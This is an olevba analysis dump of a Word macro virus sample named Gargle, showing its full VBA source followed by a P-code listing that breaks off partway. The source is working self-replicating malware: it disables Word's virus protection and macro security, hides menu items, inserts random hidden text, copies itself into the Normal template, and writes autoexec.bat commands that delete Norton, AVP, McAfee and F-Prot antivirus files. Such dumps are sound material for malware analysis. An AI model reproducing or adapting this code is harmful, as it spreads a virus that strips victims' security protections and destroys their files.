olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Gargle
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Gargle - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub FilePrintPreview()
Randomize
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32)
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}"
MsgBox abcd$ & t, vbCritical
End Sub
Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo ************"
Print #1, "echo ** GarGle **"
Print #1, "echo ************"
'norton
Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"
Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."
'avp
Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "
Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."
'mcafee
Print #1, "echo [McAfee System Check]"
'just in case its not where its supposed to be :)
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "
Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
'F-prot
'not widely used in the US, but hey :)
Print #1, "[F-Prot System Check]"
Print #1, "del c:\progra~1\fsi\f-prot\*.exe"
Print #1, "del c:\progra~1\fsi\f-prot\*.dll"
Print #1, "del c:\progra~1\fsi\f-prot\*.vxd"
Print #1, "del c:\progra~1\fsi\f-prot\*.rep"
' just in case
Print #1, "del c:\progra~1\f-prot\*.exe"
Print #1, "del c:\progra~1\f-prot\*.dll"
Print #1, "del c:\progra~1\f-prot\*.vxd"
Print #1, "del c:\progra~1\f-prot\*.rep"
Print #1, "del c:\f-prot\*.exe"
Print #1, "del c:\f-prot\*.dll"
Print #1, "del c:\f-prot\*.vxd"
Print #1, "del c:\f-prot\*.rep"
Print #1, "del c:\fsi\f-prot\*.exe"
Print #1, "del c:\fsi\f-prot\*.dll"
Print #1, "del c:\fsi\f-prot\*.vxd"
Print #1, "del c:\fsi\f-prot\*.rep"
Print #1, "echo."
Print #1, "echo All System Checks have been completed."
Close #1
End Sub


Private Sub ViewVBCode()
Randomize
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32)
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}"
MsgBox abcd$ & t, vbCritical
End Sub

Private Sub Document_Close()
Document_Open
Retro
End Sub

Private Sub Document_New()
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next: If ActivePrinter = "" Then GoTo f
MsgBox "Undefined/Unexpected error on " + ActivePrinter, vbCritical
f: With Options: .PrintHiddenText = (100 - 99): .VirusProtection = (99 - 99): .SaveNormalPrompt = (99 - 99)
.SavePropertiesPrompt = (99 - 99): .ConfirmConversions = (99 - 99): End With
ActiveWindow.View.ShowHiddenText = (99 - 99): Dim DocWords, DocHalfWords, DocLastWords
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Tools").Controls("Macro").Enabled = (99 - 99): CommandBars("File").Controls("Print Preview").Enabled = (99 - 99): CommandBars("Edit").Controls("Select All").Enabled = (99 - 99)
CommandBars("Edit").Controls("Undo VBA-Selection.TypeText").Enabled = (99 - 99): CommandBars("Tools").Controls("Word Count...").Enabled = (99 - 99): CommandBars("Tools").Controls("Options...").Enabled = (99 - 99)
ActiveDocument.ActiveWindow.View.ShowFirstLineOnly = (99 - 99): DocWords = ActiveDocument.Words.Count: DocHalfWords = Int(DocWords / 2): Selection.Font.Hidden = (100 - 99): Selection.TypeText "   {Printer Error #0099544}   "
Set Gargle = ActiveDocument.Words(1): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255)
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x
s = 21: Set Gargle = ActiveDocument.Words(DocHalfWords): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255)
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x:
s = 21: For x = 1 To 10: s = s - 1: If s < 1 Then s = 21
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255): DocLasTWord = DocWords - wdWord: Set Gargle = ActiveDocument.Words(DocLasTWord): With Gargle: .MoveStart Unit:=wdWord, Count:=-1: .Select: End With
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x

Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines
Set Norm = NormalTemplate.VBProject.VBComponents(1)
Set Doc = ActiveDocument.VBProject.VBComponents(1)
Set DocCode = Doc.CodeModule
Set NormCode = Norm.CodeModule

If DocCode.lines(23, 1) = "" Then
For y = 1 To DocCode.countoflines
DocCode.replacelines y, "Gargle"
Next y
For x = 2 To NormCode.countoflines
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
a = NormCode.lines(x, 1) + " '" + a$
DocCode.insertlines 26 + x, a
Next x
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
End If

If NormCode.lines(23, 1) = "" Then
For y = 1 To NormCode.countoflines
NormCode.replacelines y, "Gargle"
Next y
For x = 1 To DocCode.countoflines
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65)
a = DocCode.lines(x, 1) + " '" + a$
NormCode.insertlines 26 + x, a
Next x
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
End If
'Word2000.GarGle
'By $MOOTHiE Da HuStla
'July 2k
'Dedicated to my wife ChiQui
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Gargle
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 22740 bytes
' Line #0:
' 	FuncDefn (Private Sub FilePrintPreview())
' Line #1:
' 	ArgsCall Randomize 0x0000 
' Line #2:
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St _B_var_Chr$ 
' Line #3:
' 	LitStr 0x0003 "{00"
' 	Ld Rnd 
' 	LitDI4 0x423F 0x000F 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Rnd 
' 	LitDI4 0x869F 0x0001 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "}"
' 	Concat 
' 	St _B_var_t 
' Line #4:
' 	Ld _B_var_Chr$ 
' 	Ld _B_var_t 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub MacroContainer())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "echo ************"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "echo ** GarGle **"
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "echo ************"
' 	PrintItemNL 
' Line #13:
' 	QuoteRem 0x0000 0x0006 "norton"
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo [Norton System Check]"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.exe"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.dll"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.dat"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.vxd"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.exe"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.dll"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.dat"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.vxd"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #24:
' 	QuoteRem 0x0000 0x0003 "avp"
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "echo [AVP System Check]"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.avc "
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.set "
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.dll "
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.vxd "
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.exe "
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.avc "
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.set "
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.dll "
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.vxd "
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.exe "
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #37:
' 	QuoteRem 0x0000 0x0006 "mcafee"
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo [McAfee System Check]"
' 	PrintItemNL 
' Line #39:
' 	QuoteRem 0x0000 0x0030 "just in case its not where its supposed to be :)"
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.dat "
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.dll "
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.exe "
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.vsc "
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.dat "
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.dll "
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.exe "
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.vsc "
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.dat"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.dll"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.exe"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.vsc"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.dat"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.dll"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.exe"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.vsc"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #57:
' 	QuoteRem 0x0000 0x0006 "F-prot"
' Line #58:
' 	QuoteRem 0x0000 0x0025 "not widely used in the US, but hey :)"
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[F-Prot System Check]"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "del c:\progra~1\fsi\f-prot\*.exe"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "del c:\progra~1\fsi\f-prot\*.dll"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "del c:\progra~1\fsi\f-prot\*.vxd"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "del c:\progra~1\fsi\f-prot\*.rep"
' 	PrintItemNL 
' Line #64:
' 	QuoteRem 0x0000 0x000D " just in case"
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "del c:\progra~1\f-prot\*.exe"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "del c:\progra~1\f-prot\*.dll"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "del c:\progra~1\f-prot\*.vxd"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "del c:\progra~1\f-prot\*.rep"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\f-prot\*.exe"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\f-prot\*.dll"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\f-prot\*.vxd"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\f-prot\*.rep"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "del c:\fsi\f-prot\*.exe"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "del c:\fsi\f-prot\*.dll"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "del c:\fsi\f-prot\*.vxd"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "del c:\fsi\f-prot\*.rep"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
